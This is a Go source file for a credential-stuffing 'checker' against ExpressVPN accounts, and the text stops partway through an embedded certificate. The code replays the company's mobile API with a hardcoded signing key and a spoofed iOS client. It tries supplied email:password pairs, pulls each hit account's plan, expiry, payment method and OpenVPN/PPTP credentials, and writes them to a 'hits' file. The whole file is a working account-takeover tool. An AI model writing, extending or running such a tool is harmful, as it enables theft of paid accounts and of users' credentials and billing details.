package main

import (
        "bufio"
        "bytes"
        "compress/gzip"
        "crypto/aes"
        "crypto/cipher"
        "crypto/des"
        "crypto/hmac"
        "crypto/rand"
        "crypto/rsa"
        "crypto/sha1"
        "crypto/x509"
        "encoding/asn1"
        "encoding/base64"
        "encoding/json"
        "fmt"
        "io"
        "math/big"
        "net/http"
        "os"
        "sort"
        "strconv"
        "strings"
        "sync"
        "sync/atomic"
        "time"
)

const (
        hmacKeyStr    = "@~y{T4]wfJMA},qG}06rDO{f0<kYEwYWX'K)-GOyB^exg;K_k-J7j%$)L@[2me3~"
        clientVersion = "11.5.2"
        osName        = "ios"
        osVersion     = "14.4"
        userAgent1    = "xvclient/v21.21.0 (ios; 14.4) ui/11.5.2"
        userAgent2    = "xvclient/v21.21.0 (ios wiecz; 14.4) ui/11.5.2"
        sigSuffix     = "91c776e"
        baseURL       = "https://www.expressapisv2.net"

        certB64 = "MIIDXTCCAkWgAwIBAgIJALPWYfHAoH+CMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwHhcNMTcxMTA5MDUwNTIzWhcNMjcxMTA3MDUwNTIzWjBFMQswCQYDVQQGEwJBVTETMBEGA1UECAwKU29tZS1TdGF0ZTEhMB8GA1UECgwYSW50ZXJuZXQgV2lkZ2l0cyBQdHkgTHRkMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtUCqVSHRqQ5XnrnA4KEnGSLGRSHWgyOgpNzNjEUmjlO25Ojncaw0u+hHAns8I3kNPk0qFlGP7oLeZvFH8+duDF02j4yVFDHkHRGyTBe3PsYvztDVzmddtG8eBgwJ88PocBXDjJvCojfkyQ8sY4EtK3y0UDJj4uJKckVdLUL8wFt2DPj+A3E4/KgYELNXA3oUlNjFwr4kqpxeDjvTi3W4T02bhRXYXgDMgQgtLZMpf1zOpM2lfqRq6sFoOmzlBTv2qbvmcOSEz3ZamwFxoYDB86EfnKPCq6ZareO/1MWGHwxH24SoJhFmyOsvq/kPPa03GJnKtMUznTnBVhwWy7KJIwIDAQABo1AwTjAdBgNVHQ4EFgQUoKnoagA0CLOLTzDb2lQ/v/osUz0wHwYDVR0jBBgwFoAUoKnoagA0CLOLTzDb2lQ/v/osUz0wDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEAmF8BLuzF0rY2T2v2jTpCiqKxXARjalSjmDJLzDTWojrurHC5C/xVB8Hg+8USHPoM4V7Hr0zE4GYT5N5V+pJp/CUHppzzY9uYAJ1iXJpLXQyRD/SR4BaacMHUqakMjRbm3hwyi/pe4oQmyg66rZClV6eBxEnFKofArNtdCZWGliRAy9P8krF8poSElJtvlYQ70vWiZVIU7kV6adMVFtmPq4stjog7c2Pu0EEylRlclWlD0r8YSuvA8XoMboYyfp+RiyixhqL1o2C1JJTjY4S/t+UvQq5xTsWun+PrDoEtupjto/0sRGnD9GB5Pe0J2+VGbx3ITPStNzOuxZ4BXLe7YA=="

        colorReset  = "\033[0m"
        colorRed    = "\033[31m"
        colorGreen  = "\033[32m"
        colorYellow = "\033[33m"
        colorCyan   = "\033[36m"
        colorWhite  = "\033[37m"
        colorBold   = "\033[1m"
        colorDim    = "\033[2m"
        colorPurple = "\033[35m"
)

// ─── server database ──────────────────────────────────────────────────────────

type Server struct {
        Country  string
        City     string
        Hostname string
        TCP      bool
        UDP      bool
}

var servers = []Server{
        {"Albania", "", "albania-ca-version-2.expressnetw.com", false, true},
        {"Algeria", "", "algeria-ca-version-2.expressnetw.com", false, true},
        {"Andorra", "", "andorra-ca-version-2.expressnetw.com", false, true},
        {"Argentina", "", "argentina-ca-version-2.expressnetw.com", false, true},
        {"Armenia", "", "armenia-ca-version-2.expressnetw.com", false, true},
        {"Australia", "Brisbane", "australia-brisbane-ca-version-2.expressnetw.com", false, true},
        {"Australia", "Melbourne", "australia-melbourne-ca-version-2.expressnetw.com", false, true},
        {"Australia", "Perth", "australia-perth-ca-version-2.expressnetw.com", false, true},
        {"Australia", "Sydney", "australia-sydney-ca-version-2.expressnetw.com", false, true},
        {"Australia", "Sydney 2", "australia-sydney-2-ca-version-2.expressnetw.com", false, true},
        {"Austria", "", "austria-ca-version-2.expressnetw.com", false, true},
        {"Bahamas", "", "bahamas-ca-version-2.expressnetw.com", false, true},
        {"Bangladesh", "", "bangladesh-ca-version-2.expressnetw.com", false, true},
        {"Belarus", "", "belarus-ca-version-2.expressnetw.com", false, true},
        {"Belgium", "", "belgium-ca-version-2.expressnetw.com", false, true},
        {"Bhutan", "", "bhutan-ca-version-2.expressnetw.com", false, true},
        {"Bosnia & Herzegovina", "", "bosniaandherzegovina-ca-version-2.expressnetw.com", false, true},
        {"Brazil", "", "brazil-ca-version-2.expressnetw.com", false, true},
        {"Brazil", "2", "brazil-2-ca-version-2.expressnetw.com", false, true},
        {"Brunei", "", "brunei-ca-version-2.expressnetw.com", false, true},
        {"Cambodia", "", "cambodia-ca-version-2.expressnetw.com", false, true},
        {"Canada", "Montreal", "canada-montreal-ca-version-2.expressnetw.com", false, true},
        {"Canada", "Toronto", "canada-toronto-ca-version-2.expressnetw.com", false, true},
        {"Canada", "Toronto 2", "canada-toronto-2-ca-version-2.expressnetw.com", false, true},
        {"Chile", "", "chile-ca-version-2.expressnetw.com", false, true},
        {"Colombia", "", "colombia-ca-version-2.expressnetw.com", false, true},
        {"Costa Rica", "", "costarica-ca-version-2.expressnetw.com", false, true},
        {"Croatia", "", "croatia-ca-version-2.expressnetw.com", false, true},
        {"Cyprus", "", "cyprus-ca-version-2.expressnetw.com", false, true},
        {"Czech Republic", "", "czechrepublic-ca-version-2.expressnetw.com", false, true},
        {"Denmark", "", "denmark-ca-version-2.expressnetw.com", false, true},
        {"Ecuador", "", "ecuador-ca-version-2.expressnetw.com", false, true},
        {"Egypt", "", "egypt-ca-version-2.expressnetw.com", false, true},
        {"Estonia", "", "estonia-ca-version-2.expressnetw.com", false, true},
        {"Finland", "", "finland-ca-version-2.expressnetw.com", false, true},
        {"France", "Paris 1", "france-paris-1-ca-version-2.expressnetw.com", false, true},
        {"France", "Paris 2", "france-paris-2-ca-version-2.expressnetw.com", false, true},
        {"France", "Strasbourg", "france-strasbourg-ca-version-2.expressnetw.com", false, true},
        {"Georgia", "", "georgia-ca-version-2.expressnetw.com", false, true},
        {"Germany", "Darmstadt", "germany-darmstadt-ca-version-2.expressnetw.com", false, true},
        {"Germany", "Frankfurt 1", "germany-frankfurt-1-ca-version-2.expressnetw.com", false, true},
        {"Germany", "Nuremberg", "germany-nuremberg-ca-version-2.expressnetw.com", false, true},
        {"Greece", "", "greece-ca-version-2.expressnetw.com", false, true},
        {"Guatemala", "", "guatemala-ca-version-2.expressnetw.com", false, true},
        {"Hong Kong", "", "hongkong-2-ca-version-2.expressnetw.com", false, true},
        {"Hungary", "", "hungary-ca-version-2.expressnetw.com", false, true},
        {"Iceland", "", "iceland-ca-version-2.expressnetw.com", false, true},
        {"Indonesia", "", "indonesia-ca-version-2.expressnetw.com", false, true},
        {"Ireland", "", "ireland-ca-version-2.expressnetw.com", false, true},
        {"Isle Of Man", "", "isleofman-ca-version-2.expressnetw.com", false, true},
        {"Israel", "", "israel-ca-version-2.expressnetw.com", false, true},
        {"Italy", "Cosenza", "italy-cosenza-ca-version-2.expressnetw.com", false, true},
        {"Italy", "Milan", "italy-milan-ca-version-2.expressnetw.com", false, true},
        {"Japan", "Kawasaki", "japan-kawasaki-ca-version-2.expressnetw.com", false, true},
        {"Japan", "Tokyo", "japan-tokyo-1-ca-version-2.expressnetw.com", false, true},
        {"Jersey", "", "jersey-ca-version-2.expressnetw.com", false, true},
        {"Kazakhstan", "", "kazakhstan-ca-version-2.expressnetw.com", false, true},
        {"Kenya", "", "kenya-ca-version-2.expressnetw.com", false, true},
        {"Laos", "", "laos-ca-version-2.expressnetw.com", false, true},
        {"Latvia", "", "latvia-ca-version-2.expressnetw.com", false, true},
        {"Liechtenstein", "", "liechtenstein-ca-version-2.expressnetw.com", false, true},
        {"Lithuania", "", "lithuania-ca-version-2.expressnetw.com", false, true},
        {"Luxembourg", "", "luxembourg-ca-version-2.expressnetw.com", false, true},
        {"Macau", "", "macau-ca-version-2.expressnetw.com", false, true},
        {"Malaysia", "", "malaysia-ca-version-2.expressnetw.com", false, true},
        {"Malta", "", "malta-ca-version-2.expressnetw.com", false, true},
        {"Mexico", "", "mexico-ca-version-2.expressnetw.com", false, true},
        {"Moldova", "", "moldova-ca-version-2.expressnetw.com", false, true},
        {"Monaco", "", "monaco-ca-version-2.expressnetw.com", false, true},
        {"Mongolia", "", "mongolia-ca-version-2.expressnetw.com", false, true},
        {"Montenegro", "", "montenegro-ca-version-2.expressnetw.com", false, true},
        {"Myanmar", "", "myanmar-ca-version-2.expressnetw.com", false, true},
        {"Nepal", "", "nepal-ca-version-2.expressnetw.com", false, true},
        {"Netherlands", "Amsterdam", "netherlands-amsterdam-ca-version-2.expressnetw.com", false, true},
        {"Netherlands", "Rotterdam", "netherlands-rotterdam-ca-version-2.expressnetw.com", false, true},
        {"Netherlands", "The Hague", "netherlands-thehague-ca-version-2.expressnetw.com", false, true},
        {"New Zealand", "", "newzealand-ca-version-2.expressnetw.com", false, true},
        {"North Macedonia", "", "macedonia-ca-version-2.expressnetw.com", false, true},
        {"Norway", "", "norway-ca-version-2.expressnetw.com", false, true},
        {"Panama", "", "panama-ca-version-2.expressnetw.com", false, true},
        {"Peru", "", "peru-ca-version-2.expressnetw.com", false, true},
        {"Philippines via Singapore", "", "ph-via-sing-ca-version-2.expressnetw.com", false, true},
        {"Poland", "", "poland-ca-version-2.expressnetw.com", false, true},
        {"Portugal", "", "portugal-ca-version-2.expressnetw.com", false, true},
        {"Romania", "", "romania-ca-version-2.expressnetw.com", false, true},
        {"Serbia", "", "serbia-ca-version-2.expressnetw.com", false, true},
        {"Singapore", "CBD", "singapore-cbd-ca-version-2.expressnetw.com", false, true},
        {"Singapore", "Jurong", "singapore-jurong-ca-version-2.expressnetw.com", false, true},
        {"Singapore", "Marina Bay", "singapore-marinabay-ca-version-2.expressnetw.com", false, true},
        {"Slovakia", "", "slovakia-ca-version-2.expressnetw.com", false, true},
        {"Slovenia", "", "slovenia-ca-version-2.expressnetw.com", false, true},
        {"South Africa", "", "southafrica-ca-version-2.expressnetw.com", false, true},
        {"South Korea", "", "southkorea2-ca-version-2.expressnetw.com", false, true},
        {"Spain", "Barcelona", "spain-barcelona-ca-version-2.expressnetw.com", false, true},
        {"Spain", "Madrid", "spain-ca-version-2.expressnetw.com", false, true},
        {"Sri Lanka", "", "srilanka-ca-version-2.expressnetw.com", false, true},
        {"Sweden", "", "sweden-ca-version-2.expressnetw.com", false, true},
        {"Switzerland", "", "switzerland-ca-version-2.expressnetw.com", false, true},
        {"Switzerland", "2", "switzerland-2-ca-version-2.expressnetw.com", false, true},
        {"Taiwan", "", "taiwan-2-ca-version-2.expressnetw.com", false, true},
        {"Thailand", "", "thailand-ca-version-2.expressnetw.com", false, true},
        {"Turkey", "", "turkey-ca-version-2.expressnetw.com", false, true},
        {"UK", "Docklands", "uk-berkshire-2-ca-version-2.expressnetw.com", false, true},
        {"UK", "East London", "uk-east-london-ca-version-2.expressnetw.com", false, true},
        {"UK", "London", "uk-london-ca-version-2.expressnetw.com", false, true},
        {"USA", "Atlanta", "usa-atlanta-ca-version-2.expressnetw.com", false, true},
        {"USA", "Chicago", "usa-chicago-ca-version-2.expressnetw.com", false, true},
        {"USA", "Dallas", "usa-dallas-ca-version-2.expressnetw.com", false, true},
        {"USA", "Denver", "usa-denver-ca-version-2.expressnetw.com", false, true},
        {"USA", "Los Angeles", "usa-losangeles-ca-version-2.expressnetw.com", false, true},
        {"USA", "Los Angeles 2", "usa-losangeles-2-ca-version-2.expressnetw.com", false, true},
        {"USA", "Los Angeles 3", "usa-losangeles-3-ca-version-2.expressnetw.com", false, true},
        {"USA", "Miami", "usa-miami-ca-version-2.expressnetw.com", false, true},
        {"USA", "New Jersey", "usa-newjersey2-ca-version-2.expressnetw.com", false, true},
        {"USA", "New Jersey 1", "usa-newjersey-1-ca-version-2.expressnetw.com", false, true},
        {"USA", "New Jersey 3", "usa-newjersey-3-ca-version-2.expressnetw.com", false, true},
        {"USA", "New York", "usa-newyork-ca-version-2.expressnetw.com", false, true},
        {"USA", "Salt Lake City", "usa-saltlakecity-ca-version-2.expressnetw.com", false, true},
        {"USA", "San Francisco", "usa-sanfrancisco-ca-version-2.expressnetw.com", false, true},
        {"USA", "Seattle", "usa-seattle-ca-version-2.expressnetw.com", false, true},
        {"USA", "Tampa", "usa-tampa-1-ca-version-2.expressnetw.com", false, true},
        {"USA", "Washington DC", "usa-washingtondc-ca-version-2.expressnetw.com", false, true},
        {"Ukraine", "", "ukraine-ca-version-2.expressnetw.com", false, true},
        {"Uruguay", "", "uruguay-ca-version-2.expressnetw.com", false, true},
        {"Uzbekistan", "", "uzbekistan-ca-version-2.expressnetw.com", false, true},
        {"Venezuela", "", "venezuela-ca-version-2.expressnetw.com", false, true},
        {"Vietnam", "", "vietnam-ca-version-2.expressnetw.com", false, true},
}

// selected server for this session (shared across checks)
var selectedServer *Server

// ─── crypto helpers ───────────────────────────────────────────────────────────

func randBytes(n int) []byte {
        b := make([]byte, n)
        io.ReadFull(rand.Reader, b)
        return b
}

func generateInstallID() string {
        const hex = "0123456789abcdef"
        raw := randBytes(64)
        out := make([]byte, 64)
        for i, b := range raw {
                out[i] = hex[b%16]
        }
        return string(out)
}

func computeHMAC(data []byte) string {
        mac := hmac.New(sha1.New, []byte(hmacKeyStr))
        mac.Write(data)
        return base64.StdEncoding.EncodeToString(mac.Sum(nil))
}

func gzipCompress(data []byte) ([]byte, error) {
        var buf bytes.Buffer
        w := gzip.NewWriter(&buf)
        if _, err := w.Write(data); err != nil {
                return nil, err
        }
        if err := w.Close(); err != nil {
                return nil, err
        }
        return buf.Bytes(), nil
}

func aesDecrypt(data, key, iv []byte) ([]byte, error) {
        block, err := aes.NewCipher(key)
        if err != nil {
                return nil, err
        }
        if len(data) == 0 || len(data)%aes.BlockSize != 0 {
                return nil, fmt.Errorf("bad data length: %d", len(data))
        }
        out := make([]byte, len(data))
        cipher.NewCBCDecrypter(block, iv).CryptBlocks(out, data)
        pad := int(out[len(out)-1])
        if pad == 0 || pad > aes.BlockSize {
                return nil, fmt.Errorf("invalid padding: %d", pad)
        }
        return out[:len(out)-pad], nil
}

func buildTLV(class, tag int, compound bool, content []byte) []byte {
        tagByte := byte(class<<6) | byte(tag&0x1f)
        if compound {
                tagByte |= 0x20
        }
        n := len(content)
        var lenBytes []byte
        switch {
        case n < 128:
                lenBytes = []byte{byte(n)}
        case n < 256:
                lenBytes = []byte{0x81, byte(n)}
        case n < 65536:
                lenBytes = []byte{0x82, byte(n >> 8), byte(n)}
        default:
                lenBytes = []byte{0x83, byte(n >> 16), byte(n >> 8), byte(n)}
        }
        out := []byte{tagByte}
        out = append(out, lenBytes...)
        out = append(out, content...)
        return out
}

func buildSEQ(content []byte) []byte { return buildTLV(0, 16, true, content) }
func buildSET(content []byte) []byte { return buildTLV(0, 17, true, content) }

func buildOID(oid asn1.ObjectIdentifier) []byte {
        b, _ := asn1.Marshal(oid)
        return b
}
func buildINT(n int) []byte {
        b, _ := asn1.Marshal(n)
        return b
}
func buildBigINT(n *big.Int) []byte {
        b, _ := asn1.Marshal(n)
        return b
}
func buildOCTET(data []byte) []byte { return buildTLV(0, 4, false, data) }
func buildNULL() []byte             { return []byte{0x05, 0x00} }

func envelopeEncrypt(inputData []byte, certDER []byte) ([]byte, error) {
        cert, err := x509.ParseCertificate(certDER)
        if err != nil {
                return nil, fmt.Errorf("parse cert: %w", err)
        }
        rsaPub, ok := cert.PublicKey.(*rsa.PublicKey)
        if !ok {
                return nil, fmt.Errorf("cert is not RSA")
        }

        contentKey := randBytes(24)
        contentIV := randBytes(8)

        padLen := 8 - len(inputData)%8
        if padLen == 0 {
                padLen = 8
        }
        padded := make([]byte, len(inputData)+padLen)
        copy(padded, inputData)
        for i := len(inputData); i < len(padded); i++ {
                padded[i] = byte(padLen)
        }

        desBlock, err := des.NewTripleDESCipher(contentKey)
        if err != nil {
                return nil, fmt.Errorf("des3: %w", err)
        }
        encContent := make([]byte, len(padded))
        cipher.NewCBCEncrypter(desBlock, contentIV).CryptBlocks(encContent, padded)

        encKey, err := rsa.EncryptPKCS1v15(rand.Reader, rsaPub, contentKey)
        if err != nil {
                return nil, fmt.Errorf("rsa encrypt: %w", err)
        }

        issuerSerial := buildSEQ(append(cert.RawIssuer, buildBigINT(cert.SerialNumber)...))
        rsaAlgID := buildSEQ(append(
                buildOID(asn1.ObjectIdentifier{1, 2, 840, 113549, 1, 1, 1}),
                buildNULL()...,
        ))
        ktriBody := buildINT(0)
        ktriBody = append(ktriBody, issuerSerial...)
        ktriBody = append(ktriBody, rsaAlgID...)
        ktriBody = append(ktriBody, buildOCTET(encKey)...)
        ktriDER := buildSEQ(ktriBody)

        recipientInfos := buildSET(ktriDER)

        desAlgID := buildSEQ(append(
                buildOID(asn1.ObjectIdentifier{1, 2, 840, 113549, 3, 7}),
                buildOCTET(contentIV)...,
        ))

        eciBody := buildOID(asn1.ObjectIdentifier{1, 2, 840, 113549, 1, 7, 1})
        eciBody = append(eciBody, desAlgID...)
        eciBody = append(eciBody, buildTLV(2, 0, false, encContent)...)
        eciDER := buildSEQ(eciBody)

        evBody := buildINT(0)
        evBody = append(evBody, recipientInfos...)
        evBody = append(evBody, eciDER...)
        evDER := buildSEQ(evBody)

        ciBody := buildOID(asn1.ObjectIdentifier{1, 2, 840, 113549, 1, 7, 3})
        ciBody = append(ciBody, buildTLV(2, 0, true, evDER)...)
        return buildSEQ(ciBody), nil
}

// ─── account types ────────────────────────────────────────────────────────────

type AccountInfo struct {
        OVPNUsername  string
        OVPNPassword  string
        PPTPUsername  string
        PPTPPassword  string
        Plan          string
        ExpireDate    string
        DaysLeft      int
        AutoRenew     string
        PaymentMethod string
        Status        string
}

// ─── checker ──────────────────────────────────────────────────────────────────

func checkExpressVPN(email, password string) (string, *AccountInfo) {
        certDER, err := base64.StdEncoding.DecodeString(strings.Join(strings.Fields(certB64), ""))
        if err != nil {
                return "failed", nil
        }

        installID := generateInstallID()
        aesKey := randBytes(16)
        aesIV := randBytes(16)

        payload, _ := json.Marshal(map[string]string{
                "email":    email,
                "iv":       base64.StdEncoding.EncodeToString(aesIV),
                "key":      base64.StdEncoding.EncodeToString(aesKey),
                "password": password,
        })

        gzipped, err := gzipCompress(payload)
        if err != nil {
                return "failed", nil
        }

        encrypted, err := envelopeEncrypt(gzipped, certDER)
        if err != nil {
                return "failed", nil
        }

        query := fmt.Sprintf("client_version=%s&installation_id=%s&os_name=%s&os_version=%s",
                clientVersion, installID, osName, osVersion)
        headerRaw := fmt.Sprintf("POST /apis/v2/credentials?%s", query)
        url1 := fmt.Sprintf("%s/apis/v2/credentials?%s", baseURL, query)

        hSig := computeHMAC([]byte(headerRaw))
        bSig := computeHMAC(encrypted)

        req1, _ := http.NewRequest("POST", url1, bytes.NewReader(encrypted))
        req1.Header.Set("User-Agent", userAgent1)
        req1.Header.Set("Content-Type", "application/octet-stream")
        req1.Header.Set("X-Body-Compression", "gzip")
        req1.Header.Set("X-Signature", fmt.Sprintf("2 %s %s", hSig, sigSuffix))
        req1.Header.Set("X-Body-Signature", fmt.Sprintf("2 %s %s", bSig, sigSuffix))
        req1.Header.Set("Accept-Language", "en")
        req1.Header.Set("Expect", "")

        client := &http.Client{Timeout: 30 * time.Second}
        resp1, err := client.Do(req1)
        if err != nil {
                return "failed", nil
        }
        defer resp1.Body.Close()

        switch resp1.StatusCode {
        case 429:
                return "rate_limited", nil
        case 401:
                return "failed", nil
        }
        if resp1.StatusCode != 200 {
                return "failed", nil
        }

        body1, _ := io.ReadAll(resp1.Body)
        decrypted, err := aesDecrypt(body1, aesKey, aesIV)
        if err != nil {
                return "failed", nil
        }

        var respJSON map[string]interface{}
        if err := json.Unmarshal(decrypted, &respJSON); err != nil {
                return "failed", nil
        }

        info := &AccountInfo{}
        str := func(k string) string { s, _ := respJSON[k].(string); return s }
        info.OVPNUsername = str("ovpn_username")
        info.OVPNPassword = str("ovpn_password")
        info.PPTPUsername = str("pptp_username")
        info.PPTPPassword = str("pptp_password")

        accessToken := str("access_token")
        if accessToken == "" {
                return "failed", nil
        }

        subQuery := fmt.Sprintf("access_token=%s&client_version=%s&installation_id=%s&os_name=%s&os_version=%s&reason=activation_with_email",
                accessToken, clientVersion, installID, osName, osVersion)
        subRaw := fmt.Sprintf("GET /apis/v2/subscription?%s", subQuery)
        subHSig := computeHMAC([]byte(subRaw))

        batchQuery := fmt.Sprintf("client_version=%s&installation_id=%s&os_name=%s&os_version=%s",
                clientVersion, installID, osName, osVersion)
        batchRaw := fmt.Sprintf("POST /apis/v2/batch?%s", batchQuery)
        batchSig := computeHMAC([]byte(batchRaw))
        batchURL := fmt.Sprintf("%s/apis/v2/batch?%s", baseURL, batchQuery)

        captureBody, _ := json.Marshal([]map[string]interface{}{{
                "headers": map[string]string{
                        "Accept-Language": "en",
                        "X-Signature":     fmt.Sprintf("2 %s %s", subHSig, sigSuffix),
                },
                "method": "GET",
                "url":    fmt.Sprintf("/apis/v2/subscription?%s", subQuery),
        }})

        capSig := computeHMAC(captureBody)

        req2, _ := http.NewRequest("POST", batchURL, bytes.NewReader(captureBody))
        req2.Header.Set("User-Agent", userAgent2)
        req2.Header.Set("X-Body-Compression", "gzip")
        req2.Header.Set("X-Signature", fmt.Sprintf("2 %s %s", batchSig, sigSuffix))
        req2.Header.Set("X-Body-Signature", fmt.Sprintf("2 %s %s", capSig, sigSuffix))
        req2.Header.Set("Accept-Language", "en")
        req2.Header.Set("Accept-Encoding", "gzip, deflate")
        req2.Header.Set("Content-Type", "application/json")

        resp2, err := client.Do(req2)
        if err != nil {
                return "failed", nil
        }
        defer resp2.Body.Close()

        if resp2.StatusCode == 429 {
                return "rate_limited", nil
        }

        var bodyReader2 io.Reader = resp2.Body
        if resp2.Header.Get("Content-Encoding") == "gzip" {
                gr, err := gzip.NewReader(resp2.Body)
                if err == nil {
                        defer gr.Close()
                        bodyReader2 = gr
                }
        }

        body2, _ := io.ReadAll(bodyReader2)

        var batchData []map[string]interface{}
        if err := json.Unmarshal(body2, &batchData); err != nil || len(batchData) == 0 {
                return "failed", nil
        }

        checkRateLimit := func(m map[string]interface{}, key string) bool {
                if v, ok := m[key].(float64); ok && v == 429 {
                        return true
                }
                return false
        }
        if checkRateLimit(batchData[0], "code") || checkRateLimit(batchData[0], "status") {
                return "rate_limited", nil
        }

        subBodyRaw, _ := batchData[0]["body"].(string)
        if subBodyRaw == "" {
                return "failed", nil
        }
        subBodyRaw = strings.ReplaceAll(subBodyRaw, `\"`, `"`)

        var subJSON map[string]interface{}
        if err := json.Unmarshal([]byte(subBodyRaw), &subJSON); err != nil {
                return "failed", nil
        }

        if sub, ok := subJSON["subscription"].(map[string]interface{}); ok {
                subJSON = sub
        }

        licenseStatus := strings.ToUpper(fmt.Sprintf("%v", subJSON["license_status"]))

        if v, ok := subJSON["billing_cycle"].(float64); ok {
                info.Plan = fmt.Sprintf("%.0f Month", v)
        }
        if v, ok := subJSON["expiration_time"].(float64); ok {
                t := time.Unix(int64(v), 0)
                info.ExpireDate = t.Format("2006-01-02")
                info.DaysLeft = int(time.Until(t).Hours() / 24)
        }
        if v, ok := subJSON["auto_bill"]; ok {
                info.AutoRenew = strings.ToLower(fmt.Sprintf("%v", v))
        }
        if v, ok := subJSON["payment_method"].(string); ok {
                info.PaymentMethod = v
        }

        if licenseStatus == "REVOKED" {
                info.Status = "FREE"
                return "free", info
        }
        if licenseStatus == "TRIAL" {
                if exp, ok := subJSON["expiration_time"].(float64); ok {
                        if time.Now().Unix() < int64(exp) {
                                info.Status = "TRIAL"
                                return "trial", info
                        }
                }
        }
        if licenseStatus == "ACTIVE" || licenseStatus == "PAID" {
                if exp, ok := subJSON["expiration_time"].(float64); ok {
                        if time.Now().Unix() < int64(exp) {
                                info.Status = "PREMIUM"
                                return "premium", info
                        }
                }
        }
        info.Status = "UNKNOWN"
        return "failed", info
}

// ─── output ───────────────────────────────────────────────────────────────────

func saveHit(email, password string, info *AccountInfo) {
        f, err := os.OpenFile("ExpressVpnHits.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
        if err != nil {
                return
        }
        defer f.Close()
        fmt.Fprintf(f, "%s:%s | Status = %s | OVPNUsername = %s | OVPNPassword = %s | PPTPUsername = %s | PPTPPassword = %s | Plan = %s | ExpireDate = %s | DaysLeft = %d | AutoRenew = %s | PaymentMethod = %s\n",
                email, password,
                info.Status,
                info.OVPNUsername, info.OVPNPassword,
                info.PPTPUsername, info.PPTPPassword,
                info.Plan, info.ExpireDate, info.DaysLeft,
                info.AutoRenew, info.PaymentMethod,
        )
}

func serverHostname() string {
        if selectedServer != nil {
                return selectedServer.Hostname
        }
        return "<server-address>"
}

func serverLabel() string {
        if selectedServer == nil {
                return "none"
        }
        if selectedServer.City != "" {
                return selectedServer.Country + " / " + selectedServer.City
        }
        return selectedServer.Country
}

// ovpnCABlock is the ExpressVPN CA3 certificate (self-signed, valid until 2124-10-13).
// This is the active CA that signs all current ExpressVPN OpenVPN server certs.
const ovpnCABlock = `-----BEGIN CERTIFICATE-----
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
